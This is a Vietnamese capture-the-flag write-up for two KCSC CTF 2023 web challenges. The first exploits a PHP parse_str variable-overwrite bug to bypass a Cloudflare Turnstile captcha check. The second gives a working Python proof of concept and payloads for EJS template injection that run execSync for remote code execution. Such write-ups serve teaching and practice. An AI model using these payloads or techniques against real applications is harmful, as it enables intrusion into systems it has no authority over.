# Bypass Captcha 
Đây là một bài mà team mình đã giải được trong giải vừa qua sau khi bắt được các tín hiệu vũ trụ từ các bậc tiền bối

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/713a11b4-b200-41e0-a552-65db26000258)

## Description
Khi truy cập vào URL của BTC cung cấp ta nhận được một trang web nhập PASSWORD để unlock flag, hành động được verify bằng capcha của Cloudflare

### Review source code, tìm root-cause
Sau khi ta verify capcha và submit password thì data gửi lên sẽ như sau:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/c387ddbc-d623-4338-b84e-b346040442e2)

Sẽ có 2 param được gửi lên server là password mà ta nhập vào và mã capcha của cloudflare trả về cho client (mã capcha này được đăng ký bởi chủ sở hữu của trang web với cloudflare)

Trên server đoạn code sau sẽ xử lý việc kiểm tra Password và mã capcha
```
<?php
include 'config.php';
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $passwd = $_POST['passwd'];
    $response = $_POST['cf-turnstile-response'];
    $ch = curl_init($SITE_VERIFY);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, [
        'secret' => $SECRET_KEY,
        'response' => $response
    ]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $data = curl_exec($ch);
    curl_close($ch);
    $data = json_decode($data);
    $now = time();
    $challenge_ts = strtotime($data->challenge_ts);
    if ($data->success == 1 && $now - $challenge_ts <= 5) {
        if ($passwd === $PASSWD) {
            die($FLAG);
        } else {
            die('Wrong password!');
        }
    } else {
        die('Verify captcha failed!');
    }
}
?>
```
Ở đây ta thấy rằng đầu tiên server sẽ xác thực capcha của client gửi lên bằng cách gửi secret key của chủ sở hữu trang web và mã capcha của client lên cloudflare

Nếu mã capcha của client là đúng và thời gian từ lúc người dùng xác thực capcha với cloudflare thành công tới lúc server kiểm tra xong mã capcha đó dưới 5s thì sẽ trả về flag

Ta sẽ phân tích thêm một số file code khác được cung cấp từ BTC

File config:
```
<?php
$SITE_VERIFY = getenv('SITE_VERIFY');
$PASSWD = getenv('PASSWD');
$FLAG = getenv('FLAG');
$SITE_KEY = getenv('SITE_KEY');
$SECRET_KEY = getenv('SECRET_KEY');
parse_str($_SERVER['QUERY_STRING']);
echo $_SERVER['QUERY_STRING'];
echo "<br>";
echo $PASSWD;
error_reporting(0);
```

Ở đây chứa các biến được gán giá trị từ việc lấy các giá trị trong các biến môi trường của server, các biến môi trường này ta có thể xem được trong file Docker được BTC cung cấp

Trở lại đoạn code trên ta sẽ đặc biệt chú ý vào biến `$_SERVER['QUERY_STRING']`, đây là một biến GLOBAL trong PHP chứa chuỗi truy vấn của URL hiện tại, ví dụ: trong URL `https://bypass-captcha.kcsc.tf/index.php?passwd=123&test=kcsc`, truy vấn của URL là `passwd=123&test=kcsc`. Trong trường hợp này, `$_SERVER['QUERY_STRING']` sẽ chứa giá trị `"passwd=123&test=kcsc"`

Sau khi qua hàm `parse_str()` nó sẽ phân tích truy vấn của URL để trích xuất các tham số và giá trị riêng lẻ, ví dụ: 
```
parse_str("passwd=123&test=kcsc")
echo $passwd;
//123
echo $test
//kcsc
```
-> Vậy từ công dụng của `parse_str($_SERVER['QUERY_STRING'])` ta có thể nhận thấy rằng các biến bên trên có thể bị ghi đè 

## Solution
Sau khi có ý tưởng ghi đè các biến bên trên bằng `QUERY_STRING` thì ta có giải quyết bài này bằng cách sau:
+ C1: Ghi đè biến `PASSWD` và nhanh tay gửi capcha tới server sao cho thời gian <5s

+ C2: Ta sẽ ghi đè `PASSWD` và ghi đè `SITE_VERIFY` (do ta có thể kiểm soát được kết quả trả về)

Trong giải này team mình làm theo cách 1:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/b5f2bfbc-e359-49ab-9eaa-cd5c71325546)

Flag: `KCSC{Bypass_Turnstile_Cloudflare_1e22c0f8}`

# valentine (stolen) 
![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/95d4588f-ebcf-4cce-a42d-e8ab20db09e8)

## Description
Bài này trong giải vừa qua mình đã không giải được do kiến thức về SSTI còn quá gaf, sau khi giải kết thúc được người ae 5h4s1 cùng lớp hint là có một bài write-up khác có thể áp dụng để giải thì mình đã áp dụng  thành công

Link WU: https://hxp.io/blog/101/hxp-CTF-2022-valentine/

Đầu tiên khi vào Challenge BTC cung cấp cho một file chứa toàn bộ Source code và file Docker

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/7b3a9622-c578-4f29-9dbe-7a0eb66570a3)

File flag nằm ở ngoài web root + WU liên quan tới SSTI nên chắc chắn ta sẽ phải RCE để đọc flag (đọc thông qua việc thực thi file readFlag)

Mình custom lại PoC của WU, hiểu nôm na là họ sẽ sử dụng kỹ thuật `SSTI using EJS custom delimiters` 

```
import requests
import re

HOST = 'https://valentine.kcsc.tf'

r = requests.post(f"{HOST}/template", data={"tmpl":"""{{ name }} <.= global.process.mainModule.require('child_process').execSync('/readflag') .>"""}, allow_redirects=False)

m = re.search(r"/(?P<uuid>.*)?name=", r.text)
r = requests.get(f"{HOST}{m.group(0)}&delimiter=.")
m = re.search(r"KCSC\{[^}]+\}", r.text)
print(m.group(0))
```
EJS custom delimiters sẽ được sử dụng để định nghĩa một delimiter mới, trong bài này sử dụng delimiter mặc định là `%`

* Note: Do trong bài có kiểm tra template gửi lên có chứa `{{name}}` hay không nên ta sẽ phải thêm chuỗi này vào template

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/9fb5f140-93b8-4b31-b4fd-62cd3d3940e3)

Chạy PoC ta được Flag:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/fd5e1a20-1085-4967-9fa6-7dbec5b7852a)

### Sau khi một số team public WU thì mình có biết thêm 1 cách dễ hiểu hơn

Do challenge không filter `{{` và `}}` mà chỉ chuyển nó sang dạng `<%=` và `%>`mà 2 dang này vẫn có thể thực thi code bình thường. Do đó ta có thể chèn 2 chuỗi template trong cùng 1 lần gửi lên

`{{ name }} 
{{ process.mainModule.require('child_process').execSync('/readflag').toString() }}`

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/48742e30-c445-4a74-9725-ebab2359032c)

Kết quả:

![image](https://github.com/duypt02/KCSC-CTF-2023/assets/86275419/b6ea3536-8809-4dea-ae51-c6403ad2fc2b)

Flag: `KCSC{https://www.youtube.com/watch?v=A5OLaBlQP9I}`



